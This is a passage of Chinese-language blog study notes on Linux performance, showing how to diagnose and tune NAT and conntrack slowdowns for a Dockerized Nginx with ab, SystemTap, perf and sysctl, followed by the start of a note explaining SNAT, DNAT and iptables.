class="hljs-keyword">source</span>               destination<br>RETURN     <span class="hljs-keyword">all</span>  --  <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">0</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">0</span><br>DNAT       tcp  --  <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">0</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">0</span>            tcp <span class="hljs-keyword">dp</span><span class="hljs-variable">t:8080</span> <span class="hljs-keyword">to</span>:<span class="hljs-number">172.17</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">8080</span><br><br></code></pre></td></tr></table></figure><p>可以看到，在 PREROUTING 链中，目的为本地的请求，会转到 DOCKER 链；而在 DOCKER 链中，目的端口为 8080 的 tcp 请求，会被 DNAT 到 172.17.0.2 的 8080 端口。其中，172.17.0.2 就是 Nginx 容器的 IP 地址。</p><p>接下来，切换到终端二中，执行 curl 命令，确认 Nginx 已经正常启动：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ curl http://192.168.0.30:8080/<br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Thank you for using nginx.<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后，再次执行上述的 ab 命令，不过这次注意，要把请求的端口号换成 8080：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment"># -c表示并发请求数为5000，-n表示总的请求数为10万</span><br><span class="hljs-comment"># -r表示套接字接收错误时仍然继续执行，-s表示设置每个请求的超时时间为2s</span><br>$ ab -c<span class="hljs-number"> 5000 </span>-n<span class="hljs-number"> 100000 </span>-r -s<span class="hljs-number"> 2 </span>http://192.168.0.30:8080/<br>...<br>apr_pollset_poll: The timeout specified has expired (70007)<br>Total of<span class="hljs-number"> 5602 </span>requests completed<br><br></code></pre></td></tr></table></figure><p>果然，刚才正常运行的 ab ，现在失败了，还报了连接超时的错误。运行 ab 时的-s 参数，设置了每个请求的超时时间为 2s，而从输出可以看到，这次只完成了 5602 个请求。</p><p>既然是为了得到 ab 的测试结果，把超时时间延长，延长到 30s。延迟增大意味着要等更长时间，为了快点得到结果，我们可以同时把总测试次数，也减少到 10000:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">$</span> <span class="hljs-string">ab</span> <span class="hljs-string">-c</span> <span class="hljs-number">5000</span> <span class="hljs-string">-n</span> <span class="hljs-number">10000</span> <span class="hljs-string">-r</span> <span class="hljs-string">-s</span> <span class="hljs-number">30</span> <span class="hljs-string">http://192.168.0.30:8080/</span><br><span class="hljs-string">...</span><br><span class="hljs-attr">Requests per second:</span>    <span class="hljs-number">76.47</span> [<span class="hljs-comment">#/sec] (mean)</span><br><span class="hljs-attr">Time per request:</span>       <span class="hljs-number">65380.868</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean)</span><br><span class="hljs-attr">Time per request:</span>       <span class="hljs-number">13.076</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean</span>, <span class="hljs-string">across</span> <span class="hljs-string">all</span> <span class="hljs-string">concurrent</span> <span class="hljs-string">requests)</span><br><span class="hljs-attr">Transfer rate:</span>          <span class="hljs-number">44.79</span> [<span class="hljs-string">Kbytes/sec</span>] <span class="hljs-string">received</span><br><br><span class="hljs-string">Connection</span> <span class="hljs-string">Times</span> <span class="hljs-string">(ms)</span><br>              <span class="hljs-string">min</span>  <span class="hljs-string">mean</span>[<span class="hljs-string">+/-sd</span>] <span class="hljs-string">median</span>   <span class="hljs-string">max</span><br><span class="hljs-attr">Connect:</span>        <span class="hljs-number">0</span> <span class="hljs-number">1300 </span><span class="hljs-number">5578.0      </span><span class="hljs-number">1</span>   <span class="hljs-number">65184</span><br><span class="hljs-attr">Processing:</span>     <span class="hljs-number">0</span> <span class="hljs-number">37916</span> <span class="hljs-number">59283.2</span>      <span class="hljs-number">1</span>  <span class="hljs-number">130682</span><br><span class="hljs-attr">Waiting:</span>        <span class="hljs-number">0</span>    <span class="hljs-number">2</span>   <span class="hljs-number">8.7</span>      <span class="hljs-number">1</span>     <span class="hljs-number">414</span><br><span class="hljs-attr">Total:</span>          <span class="hljs-number">1</span> <span class="hljs-number">39216</span> <span class="hljs-number">58711.6</span>   <span class="hljs-number">1021  </span><span class="hljs-number">130682</span><br><span class="hljs-string">...</span><br><br></code></pre></td></tr></table></figure><p>再重新看看 ab 的输出，这次的结果显示：</p><ul><li><p>每秒请求数（Requests per second）为 76；</p></li><li><p>每个请求的延迟（Time per request）为 65s；</p></li><li><p>建立连接的延迟（Connect）为 1300ms。</p></li></ul><p>显然，每个指标都比前面差了很多。</p><p>回忆一下Netfilter 中，网络包的流向以及 NAT 的原理，会发现，要保证 NAT 正常工作，就至少需要两个步骤：</p><ul><li><p>第一，利用 Netfilter 中的钩子函数（Hook），修改源地址或者目的地址。</p></li><li><p>第二，利用连接跟踪模块 conntrack ，关联同一个连接的请求和响应。</p></li></ul><p>是不是这两个地方出现了问题呢？我们用前面提到的动态追踪工具 SystemTap 来试试。</p><p>由于今天案例是在压测场景下，并发请求数大大降低，并且我们清楚知道 NAT 是罪魁祸首。所以，我们有理由怀疑，内核中发生了丢包现象。</p><p>我们可以回到终端一中，创建一个 dropwatch.stp 的脚本文件，并写入下面的内容：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs clean">#! /usr/bin/env stap<br><br>############################################################<br># Dropwatch.stp<br># Author: Neil Horman &lt;nhorman@redhat.com&gt;<br># An example script to mimic the behavior <span class="hljs-keyword">of</span> the dropwatch utility<br># http:<span class="hljs-comment">//fedorahosted.org/dropwatch</span><br>############################################################<br><br># Array to hold the list <span class="hljs-keyword">of</span> drop points we find<br>global locations<br><br># Note when we turn the monitor on and off<br>probe begin &#123; printf(<span class="hljs-string">&quot;Monitoring for dropped packets\n&quot;</span>) &#125;<br>probe end &#123; printf(<span class="hljs-string">&quot;Stopping dropped packet monitor\n&quot;</span>) &#125;<br><br># increment a drop counter for every location we drop at<br>probe kernel.trace(<span class="hljs-string">&quot;kfree_skb&quot;</span>) &#123; locations[$location] &lt;&lt;&lt; <span class="hljs-number">1</span> &#125;<br><br># Every <span class="hljs-number">5</span> seconds report our drop locations<br>probe timer.sec(<span class="hljs-number">5</span>)<br>&#123;<br>  printf(<span class="hljs-string">&quot;\n&quot;</span>)<br>  foreach (l <span class="hljs-keyword">in</span> locations-) &#123;<br>    printf(<span class="hljs-string">&quot;%d packets dropped at %s\n&quot;</span>,<br>           @count(locations[l]), symname(l))<br>  &#125;<br>  delete locations<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个脚本，跟踪内核函数 kfree_skb() 的调用，并统计丢包的位置。文件保存好后，执行下面的 stap 命令，就可以运行丢包跟踪脚本。这里的stap，是 SystemTap 的命令行工具：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> stap --<span class="hljs-keyword">all</span>-modules dropwatch.stp<br>Monitoring <span class="hljs-keyword">for</span> dropped packets<br><br></code></pre></td></tr></table></figure><p>当你看到 probe begin 输出的 “Monitoring for dropped packets” 时，表明 SystemTap 已经将脚本编译为内核模块，并启动运行了。</p><p>接着，我们切换到终端二中，再次执行 ab 命令：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ab -c<span class="hljs-number"> 5000 </span>-n<span class="hljs-number"> 10000 </span>-r -s<span class="hljs-number"> 30 </span>http://192.168.0.30:8080/<br><br></code></pre></td></tr></table></figure><p>然后，再次回到终端一中，观察 stap 命令的输出：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">10031 </span>packets dropped at nf_hook_slow<br><span class="hljs-symbol">676 </span>packets dropped at tcp_v4_rcv<br><br><span class="hljs-symbol">7284 </span>packets dropped at nf_hook_slow<br><span class="hljs-symbol">268 </span>packets dropped at tcp_v4_rcv<br><br></code></pre></td></tr></table></figure><p>会发现，大量丢包都发生在 nf_hook_slow 位置。这是在 Netfilter Hook 的钩子函数中，出现丢包问题了。但是不是 NAT，还不能确定。接下来，我们还得再跟踪 nf_hook_slow 的执行过程，这一步可以通过 perf 来完成。</p><p>我们切换到终端二中，再次执行 ab 命令：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ab -c<span class="hljs-number"> 5000 </span>-n<span class="hljs-number"> 10000 </span>-r -s<span class="hljs-number"> 30 </span>http://192.168.0.30:8080/<br><br></code></pre></td></tr></table></figure><p>然后，再次切换回终端一，执行 perf record 和 perf report 命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 记录一会（比如30s）后按Ctrl+C结束</span><br><span class="hljs-variable">$</span> perf record <span class="hljs-literal">-a</span> <span class="hljs-literal">-g</span> <span class="hljs-literal">--</span> <span class="hljs-built_in">sleep</span> <span class="hljs-number">30</span><br><br><span class="hljs-comment"># 输出报告</span><br><span class="hljs-variable">$</span> perf report <span class="hljs-literal">-g</span> graph,<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>在 perf report 界面中，输入查找命令 &#x2F; 然后，在弹出的对话框中，输入 nf_hook_slow；最后再展开调用栈，就可以得到下面这个调用图：</p><p><img src="https://static001.geekbang.org/resource/image/0e/3c/0e844a471ff1062a1db70a303add943c.png?wh=587*851" alt="img"></p><p>从这个图我们可以看到，nf_hook_slow 调用最多的有三个地方，分别是 ipv4_conntrack_in、br_nf_pre_routing 以及 iptable_nat_ipv4_in。换言之，nf_hook_slow 主要在执行三个动作。</p><ul><li><p>第一，接收网络包时，在连接跟踪表中查找连接，并为新的连接分配跟踪对象（Bucket）。</p></li><li><p>第二，在 Linux 网桥中转发包。这是因为案例 Nginx 是一个 Docker 容器，而容器的网络通过网桥来实现；</p></li><li><p>第三，接收网络包时，执行 DNAT，即把 8080 端口收到的包转发给容器。</p></li></ul><p>到这里，我们其实就找到了性能下降的三个来源。这三个来源，都是 Linux 的内核机制，所以接下来的优化，自然也是要从内核入手。</p><p>Linux 内核为用户提供了大量的可配置选项，这些选项可以通过 proc 文件系统，或者 sys 文件系统，来查看和修改。除此之外，还可以用 sysctl 这个命令行工具，来查看和修改内核配置。</p><p>比如，我们今天的主题是 DNAT，而 DNAT 的基础是 conntrack，所以我们可以先看看，内核提供了哪些 conntrack 的配置选项。</p><p>我们在终端一中，继续执行下面的命令：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dos">$ sysctl -a | grep conntrack<br><span class="hljs-built_in">net</span>.netfilter.nf_conntrack_count = <span class="hljs-number">180</span><br><span class="hljs-built_in">net</span>.netfilter.nf_conntrack_max = <span class="hljs-number">1000</span><br><span class="hljs-built_in">net</span>.netfilter.nf_conntrack_buckets = <span class="hljs-number">65536</span><br><span class="hljs-built_in">net</span>.netfilter.nf_conntrack_tcp_timeout_syn_recv = <span class="hljs-number">60</span><br><span class="hljs-built_in">net</span>.netfilter.nf_conntrack_tcp_timeout_syn_sent = <span class="hljs-number">120</span><br><span class="hljs-built_in">net</span>.netfilter.nf_conntrack_tcp_timeout_time_wait = <span class="hljs-number">120</span><br>...<br><br></code></pre></td></tr></table></figure><p>这里最重要的三个指标：</p><ul><li><p>net.netfilter.nf_conntrack_count，表示当前连接跟踪数；</p></li><li><p>net.netfilter.nf_conntrack_max，表示最大连接跟踪数；</p></li><li><p>net.netfilter.nf_conntrack_buckets，表示连接跟踪表的大小。</p></li></ul><p>所以，这个输出告诉我们，当前连接跟踪数是 180，最大连接跟踪数是 1000，连接跟踪表的大小，则是 65536。</p><p>回想一下前面的 ab 命令，并发请求数是 5000，而请求数是 100000。显然，跟踪表设置成，只记录 1000 个连接，是远远不够的。</p><p>实际上，内核在工作异常时，会把异常信息记录到日志中。比如前面的 ab 测试，内核已经在日志中报出了 “nf_conntrack: table full” 的错误。执行 dmesg 命令，可以看到：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> dmesg | tail<br>[<span class="hljs-number">104235.156774</span>] nf_conntrack: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping <span class="hljs-comment">packet</span><br>[<span class="hljs-number">104243.800401</span>] net_ratelimit: <span class="hljs-number">3939</span> callbacks suppressed<br>[<span class="hljs-number">104243.800401</span>] nf_conntrack: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping <span class="hljs-comment">packet</span><br>[<span class="hljs-number">104262.962157</span>] nf_conntrack: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping <span class="hljs-comment">packet</span><br><br></code></pre></td></tr></table></figure><p>其中，net_ratelimit 表示有大量的日志被压缩掉了，这是内核预防日志攻击的一种措施。而当你看到 “nf_conntrack: table full” 的错误时，就表明 nf_conntrack_max 太小了。</p><p>那是不是，直接把连接跟踪表调大就可以了呢？调节前，得先明白，连接跟踪表，实际上是内存中的一个哈希表。如果连接跟踪数过大，也会耗费大量内存。</p><p>其实，我们上面看到的 nf_conntrack_buckets，就是哈希表的大小。哈希表中的每一项，都是一个链表（称为 Bucket），而链表长度，就等于 nf_conntrack_max 除以 nf_conntrack_buckets。</p><p>比如，我们可以估算一下，上述配置的连接跟踪表占用的内存大小：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel"># 连接跟踪对象大小为<span class="hljs-number">376</span>，链表项大小为<span class="hljs-number">16</span><br>nf_conntrack_max*连接跟踪对象大小+nf_conntrack_buckets*链表项大小<br>= <span class="hljs-number">1000</span>*<span class="hljs-number">376</span>+<span class="hljs-number">65536</span>*<span class="hljs-number">16</span> B<br>= <span class="hljs-number">1.4</span> MB<br><br></code></pre></td></tr></table></figure><p>接下来，我们将 nf_conntrack_max 改大一些，比如改成 131072（即nf_conntrack_buckets的2倍）：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sysctl -w net.netfilter.<span class="hljs-attribute">nf_conntrack_max</span>=131072<br>$ sysctl -w net.netfilter.<span class="hljs-attribute">nf_conntrack_buckets</span>=65536<br><br></code></pre></td></tr></table></figure><p>然后再切换到终端二中，重新执行 ab 命令。注意，这次我们把超时时间也改回原来的 2s：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ab -c<span class="hljs-number"> 5000 </span>-n<span class="hljs-number"> 100000 </span>-r -s<span class="hljs-number"> 2 </span>http://192.168.0.30:8080/<br>...<br>Requests per second:    6315.99 [<span class="hljs-comment">#/sec] (mean)</span><br>Time per request:       791.641 [ms] (mean)<br>Time per request:       0.158 [ms] (mean, across all concurrent requests)<br>Transfer rate:          4985.15 [Kbytes/sec] received<br><br>Connection Times (ms)<br>              min  mean[+/-sd] median   max<br>Connect:       <span class="hljs-number"> 0 </span><span class="hljs-number"> 355 </span>793.7    <span class="hljs-number"> 29 </span>   7352<br>Processing:    <span class="hljs-number"> 8 </span><span class="hljs-number"> 311 </span>855.9    <span class="hljs-number"> 51 </span>  14481<br>Waiting:       <span class="hljs-number"> 0 </span><span class="hljs-number"> 292 </span>851.5    <span class="hljs-number"> 36 </span>  14481<br>Total:        <span class="hljs-number"> 15 </span><span class="hljs-number"> 666 </span>1216.3   <span class="hljs-number"> 148 </span>  14645<br><br></code></pre></td></tr></table></figure><p>可以看到：</p><ul><li><p>每秒请求数（Requests per second）为 6315（不用NAT时为6576）；</p></li><li><p>每个请求的延迟（Time per request）为 791ms（不用NAT时为760ms）；</p></li><li><p>建立连接的延迟（Connect）为 355ms（不用NAT时为177ms）。</p></li></ul><p>这个结果，已经比刚才的测试好了很多，也很接近最初不用 NAT 时的基准结果了。</p><p>不过，你可能还是很好奇，连接跟踪表里，到底都包含了哪些东西？这里的东西，又是怎么刷新的呢？</p><p>实际上，你可以用 conntrack 命令行工具，来查看连接跟踪表的内容。比如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># -L表示列表，-o表示以扩展格式显示</span><br>$ conntrack -L -o extended | head<br>ipv4     2 tcp      6 7 TIME_WAIT <span class="hljs-attribute">src</span>=192.168.0.2 <span class="hljs-attribute">dst</span>=192.168.0.96 <span class="hljs-attribute">sport</span>=51744 <span class="hljs-attribute">dport</span>=8080 <span class="hljs-attribute">src</span>=172.17.0.2 <span class="hljs-attribute">dst</span>=192.168.0.2 <span class="hljs-attribute">sport</span>=8080 <span class="hljs-attribute">dport</span>=51744 [ASSURED] <span class="hljs-attribute">mark</span>=0 <span class="hljs-attribute">use</span>=1<br>ipv4     2 tcp      6 6 TIME_WAIT <span class="hljs-attribute">src</span>=192.168.0.2 <span class="hljs-attribute">dst</span>=192.168.0.96 <span class="hljs-attribute">sport</span>=51524 <span class="hljs-attribute">dport</span>=8080 <span class="hljs-attribute">src</span>=172.17.0.2 <span class="hljs-attribute">dst</span>=192.168.0.2 <span class="hljs-attribute">sport</span>=8080 <span class="hljs-attribute">dport</span>=51524 [ASSURED] <span class="hljs-attribute">mark</span>=0 <span class="hljs-attribute">use</span>=1<br><br></code></pre></td></tr></table></figure><p>从这里你可以发现，连接跟踪表里的对象，包括了协议、连接状态、源IP、源端口、目的IP、目的端口、跟踪状态等。由于这个格式是固定的，所以我们可以用 awk、sort 等工具，对其进行统计分析。</p><p>比如，我们还是以 ab 为例。在终端二启动 ab 命令后，再回到终端一中，执行下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">统计总的连接跟踪数</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">conntrack -L -o extended | <span class="hljs-built_in">wc</span> -l</span><br>14289<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">统计TCP协议各个状态的连接跟踪数</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">conntrack -L -o extended | awk <span class="hljs-string">&#x27;/^.*tcp.*$/ &#123;sum[$6]++&#125; END &#123;for(i in sum) print i, sum[i]&#125;&#x27;</span></span><br>SYN_RECV 4<br>CLOSE_WAIT 9<br>ESTABLISHED 2877<br>FIN_WAIT 3<br>SYN_SENT 2113<br>TIME_WAIT 9283<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">统计各个源IP的连接跟踪数</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">conntrack -L -o extended | awk <span class="hljs-string">&#x27;&#123;print $7&#125;&#x27;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;=&quot;</span> -f 2 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | <span class="hljs-built_in">head</span> -n 10</span><br>  14116 192.168.0.2<br>    172 192.168.0.96<br><br></code></pre></td></tr></table></figure><p>这里统计了总连接跟踪数，TCP协议各个状态的连接跟踪数，以及各个源IP的连接跟踪数。你可以看到，大部分 TCP 的连接跟踪，都处于 TIME_WAIT 状态，并且它们大都来自于 192.168.0.2 这个 IP 地址（也就是运行 ab 命令的 VM2）。</p><p>这些处于 TIME_WAIT 的连接跟踪记录，会在超时后清理，而默认的超时时间是 120s，你可以执行下面的命令来查看：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl net<span class="hljs-selector-class">.netfilter</span><span class="hljs-selector-class">.nf_conntrack_tcp_timeout_time_wait</span><br>net<span class="hljs-selector-class">.netfilter</span><span class="hljs-selector-class">.nf_conntrack_tcp_timeout_time_wait</span> = <span class="hljs-number">120</span><br><br></code></pre></td></tr></table></figure><p>所以，如果你的连接数非常大，确实也应该考虑，适当减小超时时间。</p><p>除了上面这些常见配置，conntrack 还包含了其他很多配置选项，可以参考 nf_conntrack 的 <a href="https://www.kernel.org/doc/Documentation/networking/nf_conntrack-sysctl.txt">文档</a> 来配置。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>由于 NAT 基于 Linux 内核的连接跟踪机制来实现。所以，在分析 NAT 性能问题时，我们可以先从 conntrack 角度来分析，比如用 systemtap、perf 等，分析内核中 conntrack 的行文；然后，通过调整 netfilter 内核选项的参数，来进行优化。</p><p>其实，Linux 这种通过连接跟踪机制实现的 NAT，也常被称为有状态的 NAT，而维护状态，也带来了很高的性能成本。</p><p>所以，除了调整内核行为外，在不需要状态跟踪的场景下（比如只需要按预定的IP和端口进行映射，而不需要动态映射），我们也可以使用无状态的 NAT （比如用 tc 或基于 DPDK 开发），来进一步提升性能。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>9.如何优化 NAT 性能？（上）</title>
    <link href="/2022/11/14/9-%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96NAT%E6%80%A7%E8%83%BD%EF%BC%9F%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2022/11/14/9-%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96NAT%E6%80%A7%E8%83%BD%EF%BC%9F%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="9-如何优化-NAT-性能？（上）"><a href="#9-如何优化-NAT-性能？（上）" class="headerlink" title="9.如何优化 NAT 性能？（上）"></a>9.如何优化 NAT 性能？（上）</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>上一篇文章介绍了在发现网络延迟增大的情况后，可以先从路由、网络包的收发、网络包的处理，再到应用程序等，从各个层级分析网络延迟，等到找出网络延迟的来源层级后，再深入定位瓶颈所在。</p><p>这一篇文章我们来介绍另一个可能导致网络延迟的因素，即网络地址转换（Network Address Translation），缩写为 NAT。</p><p>接下来，我们先来学习 NAT 的工作原理，并弄清楚如何优化 NAT 带来的潜在性能问题。</p><h2 id="NAT原理"><a href="#NAT原理" class="headerlink" title="NAT原理"></a>NAT原理</h2><p>NAT 技术可以重写 IP 数据包的源 IP 或者目的 IP，被普遍地用来解决公网 IP 地址短缺的问题。它的主要原理就是，网络中的多台主机，通过共享同一个公网 IP 地址，来访问外网资源。同时，由于 NAT 屏蔽了内网网络，自然也就为局域网中的机器提供了安全隔离。</p><p>既可以在支持网络地址转换的路由器（称为 NAT 网关）中配置 NAT，也可以在 Linux 服务器中配置 NAT。如果采用第二种方式，Linux 服务器实际上充当的是“软”路由器的角色。</p><p>NAT 的主要目的，是实现地址转换。根据实现方式的不同，NAT 可以分为三类：</p><ul><li><p>静态 NAT，即内网 IP 与公网 IP 是一对一的永久映射关系；</p></li><li><p>动态 NAT，即内网 IP 从公网 IP 池中，动态选择一个进行映射；</p></li><li><p>网络地址端口转换 NAPT（Network Address and Port Translation），即把内网 IP 映射到公网 IP 的不同端口上，让多个内网 IP 可以共享同一个公网 IP 地址。</p></li></ul><p>NAPT 是目前最流行的 NAT 类型，我们在 Linux 中配置的 NAT 也是这种类型。而根据转换方式的不同，我们又可以把 NAPT 分为三类。</p><p>第一类是源地址转换SNAT，即目的地址不变，只替换源 IP 或源端口。SNAT 主要用于，多个内网 IP 共享同一个公网 IP ，来访问外网资源的场景。</p><p>第二类是目的地址转换DNAT，即源 IP 保持不变，只替换目的 IP 或者目的端口。DNAT 主要通过公网 IP 的不同端口号，来访问内网的多种服务，同时会隐藏后端服务器的真实 IP 地址。</p><p>第三类是双向地址转换，即同时使用 SNAT 和 DNAT。当接收到网络包时，执行 DNAT，把目的 IP 转换为内网 IP；而在发送网络包时，执行 SNAT，把源 IP 替换为外部 IP。</p><p>双向地址转换，其实就是外网 IP 与内网 IP 的一对一映射关系，所以常用在虚拟化环境中，为虚拟机分配浮动的公网 IP 地址。</p><p>下面演示一下这个过程：</p><ul><li><p>本地服务器的内网 IP 地址为 192.168.0.2；</p></li><li><p>NAT 网关中的公网 IP 地址为 100.100.100.100；</p></li><li><p>要访问的目的服务器 baidu.com 的地址为 123.125.115.110。</p></li></ul><p>那么 SNAT 和 DNAT 的过程，就如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/c7/e4/c743105dc7bd955a4a300d6b55b7a0e4.png?wh=712*610" alt="img"></p><p>从图中，你可以发现：</p><ul><li><p>当服务器访问 baidu.com 时，NAT 网关会把源地址，从服务器的内网 IP 192.168.0.2 替换成公网 IP 地址 100.100.100.100，然后才发送给 baidu.com；</p></li><li><p>当 baidu.com 发回响应包时，NAT 网关又会把目的地址，从公网 IP 地址 100.100.100.100 替换成服务器内网 IP 192.168.0.2，然后再发送给内网中的服务器。</p></li></ul><p>了解了 NAT 的原理后，我们再来看看，如何在 Linux 中实现 NAT 的功能。</p><h2 id="iptables与NAT"><a href="#iptables与NAT" class="headerlink" title="iptables与NAT"></a>iptables与NAT</h2><p>Linux 内核提供的 Netfilter 框架，允许对网络数据包进行修改（比如 NAT）和过滤（比如防火墙）。在这个基础上，iptables、ip6tables、ebtables 等工具，又提供了更易用的命令行接口，以便系统管理员配置和管理 NAT、防火墙的规则。</p><p>其中，iptables 就是最常用的一种配置工具。要掌握 iptables 的原理和使用方法，最核心的就是弄清楚，网络数据包通过 Netfilter 时的工作流向，流程图如下：</p><p><img src="https://static001.geekbang.org/resource/image/c6/56/c6de40c5bd304132a1b508ba669e7b56.png?wh=1415*435" 